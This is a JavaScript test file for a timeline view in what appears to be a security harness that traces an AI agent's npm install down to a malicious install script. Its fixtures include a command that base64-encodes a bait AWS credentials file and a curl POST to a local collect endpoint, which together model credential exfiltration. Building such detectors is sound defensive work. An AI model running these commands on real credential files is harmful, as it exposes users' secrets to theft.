import assert from 'node:assert/strict';
import test from 'node:test';
import { bestChain, chainSteps, commandRole, presentSteps, replayItems } from '../public/timeline.js';

test('roles pick install, shell, and curl apart', () => {
  assert.equal(commandRole('npm install --no-audit'), 'install');
  assert.equal(commandRole('zsh -lc "npm test"', { shell: true }), 'shell');
  assert.equal(commandRole('curl -X POST http://127.0.0.1:4199/collect'), 'request');
  assert.equal(commandRole('node install.js'), 'command');
});

test('a chain reads agent, shell, npm, then the install script', () => {
  const steps = chainSteps({
    agentLabel: 'Demo agent',
    rootPid: 10,
    ancestors: [
      { pid: 40, cmd: 'node install.js', shell: false, label: 'node' },
      { pid: 30, cmd: 'npm install', shell: false, label: 'npm' },
      { pid: 20, cmd: 'npm install --no-audit', shell: true, label: 'zsh' },
    ],
    current: { pid: 50, cmd: 'cat ~/.harness/bait/aws_credentials | base64', shell: true, label: 'sh' },
  });
  const shown = presentSteps(steps);
  assert.deepEqual(shown.map((s) => s.name), [
    'Demo agent',
    'Shell',
    'Package install',
    'Package script',
    'Install script',
  ]);
  assert.equal(shown[0].pid, 10);
  assert.equal(shown.at(-1).pid, 50);
});

test('the riskiest chain wins, and a longer one beats a tie', () => {
  const events = [
    { id: 1, ts: 1, risk: 'low', steps: [{ role: 'agent' }, { role: 'command', cmd: 'ls' }] },
    { id: 2, ts: 2, risk: 'high', steps: [{ role: 'agent', label: 'Demo agent' }, { role: 'install', cmd: 'npm install' }, { role: 'command', cmd: 'node install.js' }] },
    { id: 3, ts: 3, risk: 'high', steps: [{ role: 'agent', label: 'Demo agent' }, { role: 'shell', cmd: 'zsh' }] },
  ];
  const chain = bestChain(events);
  assert.equal(chain.eventId, 2);
  assert.equal(chain.steps[1].name, 'Package install');
  assert.equal(chain.steps[2].name, 'Package script');
});

test('the same command twice in a row is shown once', () => {
  const shown = presentSteps([
    { role: 'agent', label: 'Demo agent' },
    { role: 'install', cmd: 'npm install' },
    { role: 'shell', cmd: 'node install.js' },
    { role: 'command', cmd: 'node install.js' },
    { role: 'request', cmd: 'curl http://127.0.0.1:4199/collect' },
  ]);
  assert.deepEqual(shown.map((s) => s.name), ['Demo agent', 'Package install', 'Install script', 'Network request']);
});

test('replay keeps the ask, the script, and the pause, in order', () => {
  const items = replayItems([
    { id: 3, ts: 30, kind: 'system', risk: 'info', guard: 'paused', title: 'paused' },
    { id: 1, ts: 10, kind: 'task', risk: 'info', title: 'asked' },
    { id: 2, ts: 20, kind: 'process', risk: 'info', title: 'ls' },
    { id: 4, ts: 15, kind: 'process', risk: 'high', title: 'curl' },
  ]);
  assert.deepEqual(items.map((e) => e.id), [1, 4, 3]);
});
